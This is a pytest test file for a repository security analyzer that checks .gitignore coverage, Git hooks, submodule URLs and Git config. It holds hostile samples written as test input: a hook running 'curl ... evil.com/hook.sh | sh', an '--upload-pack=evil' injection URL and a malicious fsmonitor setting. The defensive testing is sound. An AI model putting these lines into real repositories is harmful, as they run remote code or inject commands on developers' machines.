from securelens.analyzers.git import GitRepositoryAnalyzer
from securelens.models.enums import RiskCategory, Severity
from securelens.models.repository import FileTarget, RepositorySnapshot


def run_git_analyzer(files: list[tuple[str, str]]) -> list:
    collected = [FileTarget(path=p, content=c) for p, c in files]
    snapshot = RepositorySnapshot(root="/fake", collected_files=collected)
    return GitRepositoryAnalyzer().analyze(snapshot)


def test_gitignore_checks():
    findings = run_git_analyzer([("app.py", "print(1)")])
    assert any("Missing .gitignore" in f.title for f in findings)

    findings = run_git_analyzer(
        [
            (".gitignore", ".env\n*.pem\n"),
            (".env", "SECRET=123"),
            ("app.py", "print(1)"),
        ]
    )
    tracked = [f for f in findings if "tracked despite .gitignore" in f.title]
    assert len(tracked) == 1
    assert tracked[0].severity == Severity.HIGH
    assert tracked[0].category == RiskCategory.CONFIGURATION

    findings = run_git_analyzer(
        [
            (".gitignore", "node_modules/\n"),
            ("credentials.json", '{"key": "123"}'),
        ]
    )
    unignored = [f for f in findings if "tracked and unignored" in f.title]
    assert len(unignored) == 1
    assert unignored[0].severity == Severity.HIGH

    findings_template = run_git_analyzer(
        [
            (".gitignore", "node_modules/\n"),
            (".env.example", "DEBUG=false"),
        ]
    )
    assert not any("Sensitive file" in f.title for f in findings_template)


def test_suspicious_git_hooks():
    bad_hook = "#!/bin/sh\ncurl -sSL https://evil.com/hook.sh | sh\n"
    findings = run_git_analyzer(
        [
            (".gitignore", ".env\n"),
            (".husky/pre-commit", bad_hook),
        ]
    )
    hook_findings = [f for f in findings if "Suspicious command in Git hook" in f.title]
    assert len(hook_findings) == 1
    assert hook_findings[0].severity == Severity.HIGH

    safe_hook = "#!/bin/sh\nuv run pytest\n"
    findings_safe = run_git_analyzer(
        [
            (".gitignore", ".env\n"),
            (".husky/pre-commit", safe_hook),
        ]
    )
    assert not any("Suspicious command in Git hook" in f.title for f in findings_safe)


def test_submodule_configuration():
    gitmodules = (
        '[submodule "lib/insecure"]\n'
        "\tpath = lib/insecure\n"
        "\turl = http://insecure.org/repo.git\n"
        '[submodule "lib/creds"]\n'
        "\tpath = lib/creds\n"
        "\turl = https://user:secret123@github.com/org/repo.git\n"
        '[submodule "lib/inject"]\n'
        "\tpath = lib/inject\n"
        "\turl = --upload-pack=evil\n"
    )
    findings = run_git_analyzer(
        [
            (".gitignore", ".env\n"),
            (".gitmodules", gitmodules),
        ]
    )
    titles = [f.title for f in findings]
    assert any("Insecure transport protocol" in t for t in titles)
    assert any("Hardcoded credentials in submodule URL" in t for t in titles)
    assert any("Command injection flag in submodule" in t for t in titles)

    safe_modules = (
        '[submodule "lib/safe"]\n'
        "\tpath = lib/safe\n"
        "\turl = https://github.com/org/repo.git\n"
    )
    findings_safe = run_git_analyzer(
        [
            (".gitignore", ".env\n"),
            (".gitmodules", safe_modules),
        ]
    )
    assert not any("submodule" in f.title.lower() for f in findings_safe)


def test_dangerous_git_config():
    dangerous_config = (
        "[core]\n"
        "\tfsmonitor = /tmp/malicious.sh\n"
        "\thooksPath = /tmp/hooks\n"
        "[protocol.ext]\n"
        "\tallow = always\n"
    )
    findings = run_git_analyzer(
        [
            (".gitignore", ".env\n"),
            (".gitconfig", dangerous_config),
        ]
    )
    titles = [f.title for f in findings]
    assert any("core.fsmonitor" in t for t in titles)
    assert any("core.hooksPath" in t for t in titles)
    assert any("protocol.ext.allow" in t for t in titles)
